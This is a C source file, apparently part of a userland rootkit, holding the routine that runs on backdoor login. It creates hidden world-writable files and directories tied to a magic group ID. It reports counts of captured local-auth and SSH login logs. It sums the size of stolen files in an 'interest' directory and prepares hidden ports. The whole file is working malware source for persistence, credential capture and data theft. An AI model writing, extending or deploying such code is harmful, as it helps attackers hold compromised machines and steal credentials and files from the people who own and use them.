/* 
 * everything in here is what is called upon backdoor login.
 * all files & directories we may need are created here, on the
 * first backdoor login.
 * a couple of things that .bashrc previously would've done is
 * now done here.
 */

int prepareregfile(const char *path, gid_t magicgid){
    hook(CACCESS, CCHMOD, CCREAT);
    int acc = (long)call(CACCESS, path, F_OK);
    if(acc != 0){
        int crt = (long)call(CCREAT, path, 0777);
        if(crt < 0) return -1;
        close(crt);

        if(chown_path(path, magicgid) < 0)
            return -1;

        if((long)call(CCHMOD, path, 0777) < 0)
            return -1;
    }
    return 1;
}

int preparedir(const char *path, gid_t magicgid){
    DIR *dp;
    hook(COPENDIR, CMKDIR, CCHMOD);
    dp = call(COPENDIR, path);
    if(dp != NULL){
        closedir(dp);
        return 1;
    }

    if((long)call(CMKDIR, path, 0777) < 0)
        return -1;

    if(chown_path(path, magicgid) < 0)
        return -1;

    if((long)call(CCHMOD, path, 0777) < 0)
        return -1;

    return 1;
}


#ifdef HIDE_PORTS
void prepareports(void){
    int hpa;
    hook(CACCESS);
    hpa = (long)call(CACCESS, HIDEPORTS, F_OK);
    if(hpa != 0 && errno == ENOENT)
        prepareregfile(HIDEPORTS, readgid());
}
#endif

#if defined LOG_LOCAL_AUTH || defined LOG_SSH
int logcount(const char *path){
    FILE *fp;
    char buf[LINE_MAX];
    int count=0;

    hook(CFOPEN);

    fp = call(CFOPEN, path, "r");
    if(fp == NULL) return 0;

    while(fgets(buf, sizeof(buf), fp) != NULL)
        count++;

    fclose(fp);
    return count;
}
#endif

#ifdef FILE_STEAL
off_t getstolensize(void){
    off_t ret;
    DIR *dp;
    struct dirent *dir;
    struct stat sbuf;

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char path[LEN_INTEREST_DIR+strlen(dir->d_name)+2];
        snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        ret = ret+sbuf.st_size;
    }
    closedir(dp);

    return ret;
}
#endif

void bdprep(void){
    char *curpath;
    gid_t magicgid = readgid();
    int dirs=0, regs=0;
    for(int i = 0; i != TOGPATHS_SIZE; i++){
        curpath = togpaths[i];

        if(curpath[strlen(curpath)-1] == '/'){
            if(preparedir(curpath, magicgid))
                dirs++;
            continue;
        }

        if(prepareregfile(curpath, magicgid))
            regs++;
    }

    if(regs+dirs != TOGPATHS_SIZE)
        printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
    else{
        dorolf();
        system("id&&w");
#ifdef LOG_LOCAL_AUTH
        int authc = logcount(LOG_PATH);
        if(authc>0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
#endif
#ifdef LOG_SSH
        int sshc = logcount(SSH_LOGS);
        if(sshc>0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
#endif
#ifdef FILE_STEAL
        off_t stolensize = getstolensize();
        if(stolensize > 0){
            printf("\e[1mStolen data: ");
            if(stolensize >= 1024*1024)
                printf("\e[1;31m%.2f\e[0m megabytes\n", (float)stolensize/(1024*1024));
            else if(stolensize <= 1024)
                printf("\e[1;31m%ld\e[0m bytes\n", stolensize);
            else if(stolensize > 1024)
                printf("\e[1;31m%.2f\e[0m kilobytes\n", (float)stolensize/1024);
        }
#endif
    }

#ifdef HIDE_PORTS
    prepareports();
#endif
    exit(0);
}